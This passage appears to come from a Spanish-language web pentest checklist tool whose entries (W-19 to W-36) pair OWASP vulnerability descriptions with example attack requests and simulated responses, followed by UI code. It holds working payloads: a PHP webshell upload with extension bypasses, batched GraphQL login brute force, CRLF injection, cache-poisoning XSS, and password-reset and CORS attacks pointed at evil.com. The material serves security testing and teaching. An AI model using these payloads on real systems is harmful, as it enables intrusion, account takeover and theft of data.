  res:`<span class="t-proto">HTTP/1.1</span> <span class="t-status-err">200 OK</span>

<span class="t-str t-hl">uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data
root:x:0:0:root:/root:/bin/bash</span>
<span class="t-comment">// archivo remoto incluido y ejecutado → RCE confirmado via RFI</span>`, vuln:true },

{ id:'W-19', cat:'web3', catLabel:'A03 – Injection', sev:'Crítica', box:'Black',
  name:'File Upload - subida de webshell sin restricción',
  desc:'Se sube un archivo PHP (u otro ejecutable del servidor) disfrazado como imagen o documento. Se verifican tres controles: (1) validación de extensión solo client-side, (2) Content-Type manipulable en Burp, (3) doble extensión (shell.php.jpg). Si el servidor almacena el archivo en una ruta accesible y lo sirve sin restricciones de ejecución, el atacante puede ejecutar comandos.',
  http:'Archivo ejecutable rechazado o almacenado sin capacidad de ejecución → correcto\nWebshell subida y ejecutable via HTTP → Crítica',
  cid:{c:'–',i:'RCE - webshell accesible en el servidor',d:'Acceso completo al sistema de archivos'},
  req:`<span class="t-comment">// Subir webshell con Content-Type de imagen</span>
<span class="t-method">POST</span> <span class="t-path">/upload/avatar</span> <span class="t-proto">HTTP/1.1</span>
<span class="t-hname">Content-Type:</span> <span class="t-hval">multipart/form-data; boundary=----boundary</span>

<span class="t-str">------boundary
Content-Disposition: form-data; name="file"; filename="<span class="t-hl">shell.php</span>"
Content-Type: <span class="t-hl">image/jpeg</span>

<span class="t-hl">&lt;?php system($_GET['cmd']); ?&gt;</span>
------boundary--</span>

<span class="t-comment">// Doble extensión bypass:</span>
<span class="t-str">filename="<span class="t-hl">shell.php.jpg</span>"</span>
<span class="t-comment">// Null byte bypass (PHP legacy):</span>
<span class="t-str">filename="<span class="t-hl">shell.php%00.jpg</span>"</span>`,
  res:`<span class="t-proto">HTTP/1.1</span> <span class="t-status-ok">200 OK</span>
{ <span class="t-key">"url"</span>: <span class="t-str t-hl">"/uploads/avatars/shell.php"</span> }

<span class="t-comment">// Ejecución de la webshell:</span>
<span class="t-method">GET</span> <span class="t-path">/uploads/avatars/shell.php?cmd=id</span> <span class="t-proto">HTTP/1.1</span>
<span class="t-proto">HTTP/1.1</span> <span class="t-status-err">200 OK</span>
<span class="t-str t-hl">uid=33(www-data) gid=33(www-data)</span>
<span class="t-comment">// webshell subida y ejecutable → RCE confirmado</span>`, vuln:true },

{ id:'W-20', cat:'web3', catLabel:'A03 – Injection', sev:'Media', box:'Black',
  name:'GraphQL - introspección habilitada y batch brute force',
  desc:'Si la introspección está activa en producción, un atacante mapea todo el schema (tipos, queries, mutations, campos internos) sin documentación. GraphQL también permite enviar múltiples operaciones en un único request (batching), lo que bypasea rate limits por petición. Aplica a endpoints /graphql, /api/graphql, /query. Herramienta: InQL (Burp) o graphql-voyager.',
  http:'Introspección deshabilitada en prod → correcto\nSchema completo expuesto + batching sin límite → vulnerable',
  cid:{c:'Schema completo incluyendo campos internos y mutations sensibles',i:'Brute force en un solo HTTP request via batch',d:'DoS por batch de queries costosas'},
  req:`<span class="t-comment">// Prueba 1: introspección del schema</span>
<span class="t-method">POST</span> <span class="t-path">/graphql</span> <span class="t-proto">HTTP/1.1</span>
<span class="t-hname">Content-Type:</span> <span class="t-hval">application/json</span>

{ <span class="t-key">"query"</span>: <span class="t-str t-hl">"{ __schema { types { name fields { name } } } }"</span> }

<span class="t-comment">// Prueba 2: batch - 100 logins en 1 request</span>
[
  { <span class="t-key">"query"</span>: <span class="t-str">"mutation { login(email:\"admin@emp.com\",password:\"Pass1\"){token}}"</span> },
  { <span class="t-key">"query"</span>: <span class="t-str">"mutation { login(email:\"admin@emp.com\",password:\"Pass2\"){token}}"</span> },
  <span class="t-comment">  ... 98 más ...</span>
  { <span class="t-key">"query"</span>: <span class="t-str">"mutation { login(email:\"admin@emp.com\",password:\"<span class="t-hl">Admin2024!</span>\"){token}}"</span> }
]`,
  res:`<span class="t-comment">// Introspección - schema completo expuesto:</span>
<span class="t-proto">HTTP/1.1</span> <span class="t-status-err">200 OK</span>
{ <span class="t-key">"data"</span>: { <span class="t-key">"__schema"</span>: { <span class="t-key">"types"</span>: [
  { <span class="t-key">"name"</span>:<span class="t-str">"User"</span>,     <span class="t-key">"fields"</span>:[<span class="t-str">"id"</span>,<span class="t-str">"email"</span>,<span class="t-str t-hl">"passwordHash"</span>,<span class="t-str t-hl">"internalScore"</span>] },
  { <span class="t-key">"name"</span>:<span class="t-str">"Mutation"</span>, <span class="t-key">"fields"</span>:[<span class="t-str t-hl">"deleteUser"</span>,<span class="t-str t-hl">"grantAdmin"</span>,<span class="t-str t-hl">"exportDB"</span>] }
]}}}
<span class="t-comment">// schema con campos y mutations internas expuesto → superficie de ataque mapeada</span>`, vuln:true },

// ══ A04 – INSECURE DESIGN ════════════════════════════════════════════════════
{ id:'W-21', cat:'web4', catLabel:'A04 – Insecure Design', sev:'Alta', box:'Black',
  name:'Bypass de flujo de negocio - salto de pasos',
  desc:'Se manipula el flujo de una operación multi-paso (checkout, verificación de email, aprobación de pago) navegando directamente al paso final. El servidor no valida que los pasos previos se completaron antes de ejecutar la acción final. Se identifica el endpoint final y se invoca directamente con los parámetros mínimos.',
  http:'Error / redirección al paso correcto → correcto\nAcción final ejecutada sin pasos previos → vulnerable',
  cid:{c:'–',i:'Compra sin pago, bypass de 2FA, acceso sin verificar identidad',d:'–'},
  req:`<span class="t-comment">// Flujo: carrito → pago → confirmación</span>
<span class="t-comment">// Saltar directamente al paso de confirmación:</span>
<span class="t-method">POST</span> <span class="t-path">/checkout/confirmar</span> <span class="t-proto">HTTP/1.1</span>
<span class="t-hname">Cookie:</span> <span class="t-hval">session=abc123</span>
<span class="t-hname">Content-Type:</span> <span class="t-hval">application/x-www-form-urlencoded</span>

<span class="t-key">pedido_id</span>=<span class="t-hl">9981</span>&<span class="t-key">accion</span>=confirmar`,
  res:`<span class="t-proto">HTTP/1.1</span> <span class="t-status-err">200 OK</span>

<span class="t-str t-hl">¡Pedido confirmado! Tu pedido #9981 será enviado en 24h.</span>
<span class="t-comment">// compra completada sin realizar el pago → bypass de lógica de negocio</span>`, vuln:true },

{ id:'W-22', cat:'web4', catLabel:'A04 – Insecure Design', sev:'Media', box:'Black',
  name:'Race condition - cupón / operación de un solo uso',
  desc:'Se envían múltiples peticiones idénticas en paralelo con Turbo Intruder (single-packet attack) sobre endpoints que modifican un recurso único (redimir cupón, procesar pago, retirar saldo). Sin bloqueos atómicos, varias peticiones pasan la validación con el mismo estado inicial y todas se ejecutan.',
  http:'Segunda petición rechazada → correcto\nCupón redimido múltiples veces / saldo negativo → vulnerable',
  cid:{c:'–',i:'Doble gasto, cupón de uso único explotado N veces',d:'–'},
  req:`<span class="t-comment">// Turbo Intruder: 20 peticiones simultáneas (single-packet attack)</span>
<span class="t-method">POST</span> <span class="t-path">/cupones/canjear</span> <span class="t-proto">HTTP/1.1</span>
<span class="t-hname">Cookie:</span>       <span class="t-hval">session=abc123</span>
<span class="t-hname">Content-Type:</span> <span class="t-hval">application/x-www-form-urlencoded</span>

<span class="t-key">codigo</span>=<span class="t-hl">VERANO2024</span>&<span class="t-key">monto</span>=50
<span class="t-comment">// 20 peticiones en el mismo TCP packet</span>`,
  res:`<span class="t-proto">HTTP/1.1</span> <span class="t-status-err">200 OK</span>  <span class="t-comment">[×20 respuestas]</span>
{ <span class="t-key">"estado"</span>: <span class="t-str t-hl">"canjeado"</span>, <span class="t-key">"descuento"</span>: <span class="t-num">50</span> }

<span class="t-comment">// cupón de uso único canjeado 20 veces → €1000 de descuento</span>
<span class="t-comment">// (debería haberse aplicado solo €50 una vez)</span>`, vuln:true },

{ id:'W-23', cat:'web4', catLabel:'A04 – Insecure Design', sev:'Alta', box:'Black',
  name:'Mass assignment - escritura de campos privilegiados',
  desc:'El servidor acepta campos que el usuario no debería poder escribir (role, is_admin, is_verified, credits) porque el ORM mapea el body directamente al modelo sin whitelist. Un atacante inyecta estos campos al registrarse o actualizar perfil y el servidor los guarda. Aplica a formularios HTML con campos ocultos y endpoints que aceptan JSON.',
  http:'400/422 ignorando el campo → correcto\nCampo privilegiado guardado en BD → vulnerable',
  cid:{c:'–',i:'Escalada de privilegios por campo inyectado',d:'–'},
  req:`<span class="t-method">POST</span> <span class="t-path">/registro</span> <span class="t-proto">HTTP/1.1</span>
<span class="t-hname">Content-Type:</span> <span class="t-hval">application/x-www-form-urlencoded</span>

<span class="t-key">nombre</span>=Carlos&<span class="t-key">email</span>=carlos@evil.com&<span class="t-key">password</span>=Pass1!
&<span class="t-hl"><span class="t-key">role</span>=admin</span>&<span class="t-hl"><span class="t-key">is_verified</span>=1</span>&<span class="t-hl"><span class="t-key">credits</span>=99999</span>

<span class="t-comment">// También probar como JSON si el endpoint lo acepta</span>`,
  res:`<span class="t-proto">HTTP/1.1</span> <span class="t-status-err">201 Created</span>

{ <span class="t-key">"id"</span>:          <span class="t-num">301</span>,
  <span class="t-key">"role"</span>:        <span class="t-str t-hl">"admin"</span>,   <span class="t-comment">← aceptado y guardado</span>
  <span class="t-key">"is_verified"</span>: <span class="t-hl">true</span>,     <span class="t-comment">← aceptado y guardado</span>
  <span class="t-key">"credits"</span>:     <span class="t-num t-hl">99999</span> }   <span class="t-comment">← aceptado y guardado</span>`, vuln:true },

// ══ A05 – SECURITY MISCONFIGURATION ══════════════════════════════════════════
{ id:'W-24', cat:'web5', catLabel:'A05 – Security Misconfiguration', sev:'Baja', box:'Black',
  name:'Cabeceras de seguridad HTTP ausentes',
  desc:'Se analiza la respuesta en busca de cabeceras de seguridad críticas: Content-Security-Policy, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Permissions-Policy, Strict-Transport-Security. Su ausencia facilita XSS, clickjacking, MIME sniffing y SSL stripping. Se verifican también versiones de servidor expuestas (Server, X-Powered-By).',
  http:'Todas las cabeceras presentes → correcto\nCabeceras críticas ausentes → hallazgo',
  cid:{c:'–',i:'XSS facilitado, clickjacking posible',d:'–'},
  req:`<span class="t-method">GET</span> <span class="t-path">/</span> <span class="t-proto">HTTP/1.1</span>
<span class="t-hname">Host:</span> <span class="t-hval">empresa.com</span>

<span class="t-comment">// También: curl -I https://empresa.com</span>`,
  res:`<span class="t-proto">HTTP/1.1</span> <span class="t-status-err">200 OK</span>
<span class="t-hname">Server:</span>       <span class="t-hval t-hl">Apache/2.4.51 (Ubuntu)</span>  <span class="t-comment">← versión expuesta</span>
<span class="t-hname">X-Powered-By:</span> <span class="t-hval t-hl">PHP/7.4.3</span>              <span class="t-comment">← versión expuesta</span>
<span class="t-comment">// AUSENTES:</span>
<span class="t-comment">// Content-Security-Policy     ← XSS sin mitigación</span>
<span class="t-comment">// X-Frame-Options             ← clickjacking posible</span>
<span class="t-comment">// X-Content-Type-Options      ← MIME sniffing</span>
<span class="t-comment">// Strict-Transport-Security   ← SSL stripping</span>`, vuln:true },

{ id:'W-25', cat:'web5', catLabel:'A05 – Security Misconfiguration', sev:'Alta', box:'Black',
  name:'Archivos sensibles expuestos - .git, .env, backup',
  desc:'Se fuzzean rutas conocidas que exponen datos sensibles: repositorio .git accesible (permite reconstruir código fuente), .env con credenciales, backups (.bak, .old), archivos de configuración (web.config, docker-compose.yml). Herramientas: ffuf, gobuster con SecLists/Discovery/Web-Content.',
  http:'403/404 en rutas sensibles → correcto\nArchivo con datos sensibles descargable → vulnerable',
  cid:{c:'Código fuente, credenciales de BD, claves API',i:'–',d:'–'},
  req:`<span class="t-method">GET</span> <span class="t-path">/.git/HEAD</span> <span class="t-proto">HTTP/1.1</span>
<span class="t-method">GET</span> <span class="t-path">/.env</span> <span class="t-proto">HTTP/1.1</span>
<span class="t-method">GET</span> <span class="t-path">/config.php.bak</span> <span class="t-proto">HTTP/1.1</span>
<span class="t-method">GET</span> <span class="t-path">/backup.zip</span> <span class="t-proto">HTTP/1.1</span>
<span class="t-method">GET</span> <span class="t-path">/docker-compose.yml</span> <span class="t-proto">HTTP/1.1</span>
<span class="t-hname">Host:</span> <span class="t-hval">empresa.com</span>`,
  res:`<span class="t-comment">// .git/HEAD expuesto:</span>
<span class="t-proto">HTTP/1.1</span> <span class="t-status-err">200 OK</span>
<span class="t-str t-hl">ref: refs/heads/main</span>

<span class="t-comment">// .env con credenciales:</span>
<span class="t-proto">HTTP/1.1</span> <span class="t-status-err">200 OK</span>
<span class="t-str t-hl">DB_PASSWORD=SuperSecreta2024!
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY</span>`, vuln:true },

{ id:'W-26', cat:'web5', catLabel:'A05 – Security Misconfiguration', sev:'Media', box:'Black',
  name:'HTTP Parameter Pollution (HPP)',
  desc:'Se envían parámetros duplicados en query string o body. Distintos frameworks resuelven los duplicados de forma diferente: el primero, el último, un array o concatenados. Esto puede bypassear validaciones WAF, filtros de seguridad o producir comportamiento inesperado en lógica de negocio.',
  http:'Duplicado rechazado o ignorado consistentemente → correcto\nComportamiento diferente con parámetro duplicado → vulnerable',
  cid:{c:'Bypass de controles WAF o filtros',i:'Comportamiento inesperado en lógica de negocio',d:'–'},
  req:`<span class="t-comment">// Probe 1: parámetro de rol duplicado</span>
<span class="t-method">GET</span> <span class="t-path">/usuarios?role=<span class="t-hl">user</span>&role=<span class="t-hl">admin</span></span> <span class="t-proto">HTTP/1.1</span>
<span class="t-hname">Cookie:</span> <span class="t-hval">session=abc123</span>

<span class="t-comment">// Probe 2: bypass WAF con parámetro duplicado</span>
<span class="t-method">GET</span> <span class="t-path">/admin?admin=<span class="t-hl">false</span>&admin=<span class="t-hl">true</span></span> <span class="t-proto">HTTP/1.1</span>`,
  res:`<span class="t-comment">// Servidor toma el último valor:</span>
<span class="t-proto">HTTP/1.1</span> <span class="t-status-err">200 OK</span>
{ <span class="t-key">"filter_applied"</span>: <span class="t-str t-hl">"role=admin"</span>, <span class="t-key">"users"</span>: [ <span class="t-comment">/* todos los admins */</span> ] }
<span class="t-comment">// tomó "role=admin" ignorando "role=user" → bypass de filtro</span>`, vuln:true },

{ id:'W-27', cat:'web5', catLabel:'A05 – Security Misconfiguration', sev:'Media', box:'Black',
  name:'CRLF Injection en cabeceras de respuesta',
  desc:'Se inyectan %0d%0a (CR+LF) en parámetros que el servidor refleja en cabeceras de respuesta (Location, Set-Cookie, headers personalizados). Si no se sanitizan, un atacante puede inyectar cabeceras HTTP arbitrarias: Set-Cookie para session fixation, X-XSS-Protection:0 para facilitar XSS, o manipular la respuesta para cache poisoning.',
  http:'Caracteres CR/LF sanitizados o rechazados → correcto\nCabeceras inyectadas en respuesta → vulnerable',
  cid:{c:'Cache poisoning / XSS via cabecera inyectada',i:'Session fixation via Set-Cookie inyectado',d:'–'},
  req:`<span class="t-method">GET</span> <span class="t-path">/redirect?url=https://empresa.com<span class="t-hl">%0d%0aSet-Cookie:%20session=attacker</span></span> <span class="t-proto">HTTP/1.1</span>
<span class="t-hname">Host:</span> <span class="t-hval">empresa.com</span>

<span class="t-comment">// También en parámetros reflejados en Location:</span>
<span class="t-method">GET</span> <span class="t-path">/lang?locale=es<span class="t-hl">%0d%0aX-XSS-Protection:%200</span></span> <span class="t-proto">HTTP/1.1</span>`,
  res:`<span class="t-proto">HTTP/1.1</span> <span class="t-se">302 Found</span>
<span class="t-hname">Location:</span>   <span class="t-hval">https://empresa.com</span>
<span class="t-hname">Set-Cookie:</span> <span class="t-hval t-hl">session=attacker</span>   <span class="t-comment">← cabecera inyectada via CRLF</span>
<span class="t-hname">Content-Type:</span><span class="t-hval">text/html</span>`, vuln:true },

{ id:'W-28', cat:'web5', catLabel:'A05 – Security Misconfiguration', sev:'Baja', box:'Black',
  name:'Clickjacking - iframe sobre página sensible',
  desc:'Si la app no envía X-Frame-Options o Content-Security-Policy con frame-ancestors, cualquier sitio puede incrustar la aplicación en un iframe invisible. El atacante superpone un botón engañoso sobre una acción sensible (transferencia, cambio de contraseña, eliminar cuenta) y el usuario la ejecuta sin saberlo al hacer click en lo que cree es otro elemento.',
  http:'X-Frame-Options: DENY/SAMEORIGIN → correcto\nRespuesta sin X-Frame-Options ni frame-ancestors → vulnerable',
  cid:{c:'–',i:'Acciones sensibles ejecutadas sin consentimiento',d:'–'},
  req:`<span class="t-comment">// Verificar headers en la respuesta:</span>
<span class="t-method">GET</span> <span class="t-path">/cuenta/transferir</span> <span class="t-proto">HTTP/1.1</span>
<span class="t-hname">Host:</span> <span class="t-hval">empresa.com</span>

<span class="t-comment">// PoC: página del atacante con iframe invisible</span>
<span class="t-str">&lt;iframe src="https://empresa.com/cuenta/transferir"
        style="opacity:0;position:absolute;top:0;left:0;
               width:500px;height:500px"&gt;&lt;/iframe&gt;
&lt;button style="position:absolute;top:100px;left:200px"&gt;
  ¡Gana un premio! Haz click aquí
&lt;/button&gt;</span>`,
  res:`<span class="t-proto">HTTP/1.1</span> <span class="t-status-err">200 OK</span>
<span class="t-hname">Content-Type:</span> <span class="t-hval">text/html</span>
<span class="t-comment">// X-Frame-Options: AUSENTE</span>
<span class="t-comment">// Content-Security-Policy: frame-ancestors: AUSENTE</span>
<span class="t-comment">// → página embebible en iframe → clickjacking confirmado</span>`, vuln:true },

{ id:'W-29', cat:'web5', catLabel:'A05 – Security Misconfiguration', sev:'Alta', box:'Black',
  name:'Web Cache Poisoning - respuesta maliciosa en caché',
  desc:'Se identifican cabeceras no keyed que el servidor refleja en la respuesta (X-Forwarded-Host, X-Forwarded-Scheme, X-Original-URL). Si el servidor cachea respuestas y refleja estas cabeceras, un atacante puede inyectar un payload XSS o una redirección maliciosa que queda almacenada en la caché y se sirve a todos los usuarios siguientes.',
  http:'Cabecera no keyed ignorada o no reflejada → correcto\nPayload reflejado en respuesta cacheada → vulnerable',
  cid:{c:'–',i:'XSS cacheado que afecta a todos los visitantes',d:'–'},
  req:`<span class="t-comment">// Inyectar cabecera no keyed y verificar si se refleja</span>
<span class="t-method">GET</span> <span class="t-path">/</span> <span class="t-proto">HTTP/1.1</span>
<span class="t-hname">Host:</span>             <span class="t-hval">empresa.com</span>
<span class="t-hname">X-Forwarded-Host:</span> <span class="t-hval t-hl">evil.com</span>
<span class="t-hname">X-Forwarded-Scheme:</span> <span class="t-hval t-hl">nothttps</span>

<span class="t-comment">// Con payload XSS:</span>
<span class="t-hname">X-Forwarded-Host:</span> <span class="t-hval t-hl">evil.com&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span>`,
  res:`<span class="t-proto">HTTP/1.1</span> <span class="t-status-err">200 OK</span>
<span class="t-hname">Age:</span>           <span class="t-hval">0</span>
<span class="t-hname">X-Cache:</span>       <span class="t-hval t-hl">hit</span>   <span class="t-comment">← respuesta cacheada</span>

<span class="t-str">&lt;script src="https://<span class="t-hl">evil.com</span>/app.js"&gt;&lt;/script&gt;</span>
<span class="t-comment">// X-Forwarded-Host reflejado en src del script → cacheado para todos los usuarios</span>`, vuln:true },

{ id:'W-30', cat:'web5', catLabel:'A05 – Security Misconfiguration', sev:'Alta', box:'Black',
  name:'Host Header Injection - reset de contraseña envenenado',
  desc:'Se manipula la cabecera Host en peticiones de password reset. Si el servidor usa el valor del Host para construir el link de reset enviado por email, el atacante puede cambiar el Host a su dominio y capturar el token de reset cuando la víctima hace click en el enlace. Funciona especialmente bien con colaboración accidental del servidor de email.',
  http:'Link de reset generado con el dominio correcto hardcodeado → correcto\nLink con Host del atacante en el email → vulnerable',
  cid:{c:'Token de reset de contraseña robado',i:'Account takeover via password reset poisoning',d:'–'},
  req:`<span class="t-method">POST</span> <span class="t-path">/forgot-password</span> <span class="t-proto">HTTP/1.1</span>
<span class="t-hname">Host:</span>    <span class="t-hval t-hl">evil.com</span>
<span class="t-hname">Content-Type:</span> <span class="t-hval">application/x-www-form-urlencoded</span>

<span class="t-key">email</span>=victima@empresa.com

<span class="t-comment">// Variante con X-Forwarded-Host:</span>
<span class="t-method">POST</span> <span class="t-path">/forgot-password</span> <span class="t-proto">HTTP/1.1</span>
<span class="t-hname">Host:</span>            <span class="t-hval">empresa.com</span>
<span class="t-hname">X-Forwarded-Host:</span><span class="t-hval t-hl">evil.com</span>`,
  res:`<span class="t-proto">HTTP/1.1</span> <span class="t-status-ok">200 OK</span>
{ <span class="t-key">"mensaje"</span>: <span class="t-str">"Te enviamos un enlace de recuperación"</span> }

<span class="t-comment">// Email recibido por la víctima contiene:</span>
<span class="t-str t-hl">https://evil.com/reset?token=a1b2c3d4e5f6</span>
<span class="t-comment">// víctima hace click → token capturado en servidor del atacante → account takeover</span>`, vuln:true },

{ id:'W-31', cat:'web5', catLabel:'A05 – Security Misconfiguration', sev:'Informativa', box:'Black',
  name:'Enumeración de endpoints y parámetros ocultos - fuzzing',
  desc:'Reconocimiento activo: se usan wordlists de SecLists con ffuf o Burp Intruder para enumerar rutas no documentadas, archivos de configuración y parámetros ocultos. Param Miner (extensión de Burp) automatiza la búsqueda de parámetros no documentados en query strings y headers. El objetivo es mapear la superficie de ataque real vs la visible.',
  http:'404 en rutas no documentadas → correcto\nEndpoint funcional descubierto → hallazgo para investigar',
  cid:{c:'Superficie de ataque mayor de la documentada',i:'Funciones no auditadas accesibles',d:'–'},
  req:`<span class="t-comment">// ffuf para rutas:</span>
<span class="t-method">GET</span> <span class="t-path">/FUZZ</span> <span class="t-proto">HTTP/1.1</span>
<span class="t-hname">Host:</span> <span class="t-hval">empresa.com</span>
<span class="t-comment">// Wordlist: admin, backup, api, debug, test, old, internal, config</span>

<span class="t-comment">// Param Miner - parámetros ocultos:</span>
<span class="t-method">GET</span> <span class="t-path">/usuario?<span class="t-hl">debug=true</span>&<span class="t-hl">admin=1</span>&<span class="t-hl">verbose=true</span></span> <span class="t-proto">HTTP/1.1</span>`,
  res:`<span class="t-comment">// /admin/dump descubierto:</span>
<span class="t-proto">HTTP/1.1</span> <span class="t-status-err">200 OK</span>
{ <span class="t-key">"users"</span>: [ <span class="t-comment">/* dump completo */</span> ], <span class="t-key">"total"</span>: <span class="t-num t-hl">15432</span> }

<span class="t-comment">// Parámetro oculto ?debug=true:</span>
<span class="t-proto">HTTP/1.1</span> <span class="t-status-err">200 OK</span>
{ <span class="t-key">"debug"</span>: { <span class="t-key">"db_host"</span>: <span class="t-str t-hl">"postgresql://prod-db:5432"</span> } }`, vuln:true },

{ id:'W-32', cat:'web5', catLabel:'A05 – Security Misconfiguration', sev:'Alta', box:'Black',
  name:'HTTP Request Smuggling - desincronización CL/TE',
  desc:'Se explota la discrepancia entre cómo el frontend (proxy/CDN) y el backend interpretan el tamaño del body de una petición HTTP/1.1. En CL.TE el frontend usa Content-Length y el backend Transfer-Encoding: chunked. El atacante envía una petición ambigua cuya cola "contamina" la siguiente petición de otro usuario, permitiendo bypass de controles, envenenamiento de sesiones o acceso a rutas restringidas.',
  http:'Petición procesada normalmente → sin smuggling\nTimeout en petición de sonda o respuesta anómala → smuggling posible',
  cid:{c:'Datos de otros usuarios / cabeceras de sesión',i:'Bypass de controles de seguridad del proxy, acceso a rutas internas',d:'–'},
  req:`<span class="t-comment">// CL.TE Smuggling - el frontend usa CL, el backend usa TE</span>
<span class="t-method">POST</span> <span class="t-path">/</span> <span class="t-proto">HTTP/1.1</span>
<span class="t-hname">Host:</span>              <span class="t-hval">empresa.com</span>
<span class="t-hname">Content-Length:</span>    <span class="t-hval t-hl">13</span>
<span class="t-hname">Transfer-Encoding:</span> <span class="t-hval t-hl">chunked</span>
<span class="t-hname">Connection:</span>        <span class="t-hval">keep-alive</span>

<span class="t-str t-hl">0</span>

<span class="t-str t-hl">SMUGGLED</span>

<span class="t-comment">// TE.CL - el frontend usa TE, el backend usa CL</span>
<span class="t-hname">Content-Length:</span>    <span class="t-hval t-hl">3</span>
<span class="t-hname">Transfer-Encoding:</span> <span class="t-hval t-hl">chunked</span>

<span class="t-str t-hl">8
SMUGGLED
0</span>`,
  res:`<span class="t-comment">// Timeout en sonda → posible smuggling (TE.CL):</span>
<span class="t-proto">HTTP/1.1</span> <span class="t-comment">... [timeout de 10s] ...</span>

<span class="t-comment">// Confirmación CL.TE - segunda petición recibe prefijo smuggled:</span>
<span class="t-proto">HTTP/1.1</span> <span class="t-status-err">403 Forbidden</span>
{ <span class="t-key">"error"</span>: <span class="t-str t-hl">"Unrecognized method SMUGGLED"</span> }
<span class="t-comment">// backend procesó el prefijo inyectado → smuggling confirmado</span>`, vuln:true },

{ id:'W-33', cat:'web5', catLabel:'A05 – Security Misconfiguration', sev:'Alta', box:'Black',
  name:'CORS misconfiguration - origen reflejo y credenciales',
  desc:'Se verifican dos patrones peligrosos: (1) el servidor refleja el valor del header Origin en Access-Control-Allow-Origin sin whitelist, permitiendo que cualquier dominio haga peticiones cross-origin autenticadas; (2) se combina con Access-Control-Allow-Credentials: true, lo que permite que un sitio malicioso lea respuestas con cookies de sesión del usuario víctima.',
  http:'Access-Control-Allow-Origin con dominio propio o ausente → correcto\nOrigen reflejado + Allow-Credentials: true → vulnerable',
  cid:{c:'Datos autenticados del usuario leídos desde dominio malicioso',i:'Acciones en nombre del usuario via CORS + CSRF',d:'–'},
  req:`<span class="t-comment">// Probe: ¿el servidor refleja el Origin?</span>
<span class="t-method">GET</span> <span class="t-path">/api/perfil</span> <span class="t-proto">HTTP/1.1</span>
<span class="t-hname">Host:</span>    <span class="t-hval">empresa.com</span>
<span class="t-hname">Origin:</span>  <span class="t-hval t-hl">https://evil.com</span>
<span class="t-hname">Cookie:</span>  <span class="t-hval">session=abc123</span>

<span class="t-comment">// Probe con null origin (bypass de whitelist):</span>
<span class="t-hname">Origin:</span>  <span class="t-hval t-hl">null</span>`,
  res:`<span class="t-proto">HTTP/1.1</span> <span class="t-status-err">200 OK</span>
<span class="t-hname">Access-Control-Allow-Origin:</span>      <span class="t-hval t-hl">https://evil.com</span>   <span class="t-comment">← origen reflejado</span>
<span class="t-hname">Access-Control-Allow-Credentials:</span> <span class="t-hval t-hl">true</span>

{ <span class="t-key">"email"</span>: <span class="t-str">"admin@empresa.com"</span>, <span class="t-key">"role"</span>: <span class="t-str">"admin"</span> }
<span class="t-comment">// evil.com puede leer esta respuesta con las cookies del usuario → CORS crítico</span>`, vuln:true },

// ══ A06 – VULNERABLE COMPONENTS ══════════════════════════════════════════════
{ id:'W-34', cat:'web6', catLabel:'A06 – Vulnerable Components', sev:'Baja', box:'Black',
  name:'Fingerprinting de versiones con CVE explotables',
  desc:'Se identifican versiones de servidor web, CMS, frameworks y librerías JS mediante cabeceras HTTP, comentarios HTML, archivos de versión (readme.txt, CHANGELOG, package.json) y respuestas de error. Las versiones se cruzan contra bases de datos CVE. Se verifica también si los recursos JS de terceros se cargan sin Subresource Integrity (SRI).',
  http:'Versiones ocultas / componentes actualizados → correcto\nVersión identificada con CVE explotable → hallazgo',
  cid:{c:'Según el CVE identificado',i:'Según el CVE (RCE, SQLi, XSS, etc.)',d:'Según el CVE'},
  req:`<span class="t-method">GET</span> <span class="t-path">/</span> <span class="t-proto">HTTP/1.1</span>
<span class="t-method">GET</span> <span class="t-path">/wp-includes/version.php</span> <span class="t-proto">HTTP/1.1</span>
<span class="t-method">GET</span> <span class="t-path">/readme.html</span> <span class="t-proto">HTTP/1.1</span>
<span class="t-method">GET</span> <span class="t-path">/package.json</span> <span class="t-proto">HTTP/1.1</span>
<span class="t-hname">Host:</span> <span class="t-hval">empresa.com</span>

<span class="t-comment">// Verificar SRI en el HTML:</span>
<span class="t-comment">// &lt;script src="https://cdn.jquery.com/..."&gt;  ← sin integrity=""</span>`,
  res:`<span class="t-hname">Server:</span>        <span class="t-hval t-hl">nginx/1.14.0</span>     <span class="t-comment">← CVE-2019-9511 (DoS)</span>
<span class="t-hname">X-Generator:</span>   <span class="t-hval t-hl">WordPress 5.8.1</span>   <span class="t-comment">← múltiples CVEs</span>
<span class="t-hname">X-Powered-By:</span>  <span class="t-hval t-hl">PHP/7.4.3</span>         <span class="t-comment">← EoL, sin parches</span>

<span class="t-comment">// jQuery 1.12.4 sin SRI → supply chain attack posible</span>`, vuln:true },

// ══ A07 – AUTH FAILURES ══════════════════════════════════════════════════════
{ id:'W-36', cat:'web7', catLabel:'A07 – Auth Failures', sev:'Media', box:'Black',
  name:'Brute force - sin rate limit ni lockout en login',

function openCD(menuId, btn){
  document.querySelectorAll('.cd-menu.open').forEach(m=>{ if(m.id!==menuId) m.classList.remove('open'); });
  const menu = document.getElementById(menuId);
  if(!menu) return;
  const wasOpen = menu.classList.contains('open');
  menu.classList.toggle('open');
  if(!wasOpen){
    const r = btn.getBoundingClientRect();
    const mh = Math.min(menu.scrollHeight||160, 180);
    const top = (window.innerHeight - r.bottom < mh+6) ? r.top-mh-4 : r.bottom+3;
    menu.style.top = top+'px'; menu.style.left = r.left+'px'; menu.style.minWidth = r.width+'px';
  }
}
document.addEventListener('click', e=>{
  if(!e.target.closest('.cd') && !e.target.closest('.cd-menu')){
    document.querySelectorAll('.cd-menu.open').forEach(m=>{ m.classList.remove('open'); m.style.display='none'; });
  }
});
function styleCD(btnEl, meta){
  if(!btnEl||!meta) return;
  btnEl.style.backgroundColor = meta.bg;
  btnEl.style.color           = meta.color;
  btnEl.style.borderColor     = meta.border;
}
function toggleTheme(){
  isDark = !isDark;
  document.documentElement.setAttribute('data-theme', isDark?'dark':'light');
  document.getElementById('togTrack').classList.toggle('on', !isDark);
  document.getElementById('themeLbl').textContent = isDark ? '☀ Claro' : '☾ Oscuro';
}
document.getElementById('thead').addEventListener('click', e => {
  const th = e.target.closest('th[data-col]');
  if(!th) return;
  const col = th.dataset.col;
  if(sortCol===col){ sortDir*=-1; } else { sortCol=col; sortDir=1; }
  document.querySelectorAll('thead th').forEach(h=>h.classList.remove('sort-asc','sort-desc'));
  th.classList.add(sortDir===1?'sort-asc':'sort-desc');
  CHECKS.sort((a,b)=>{
    let va,vb;
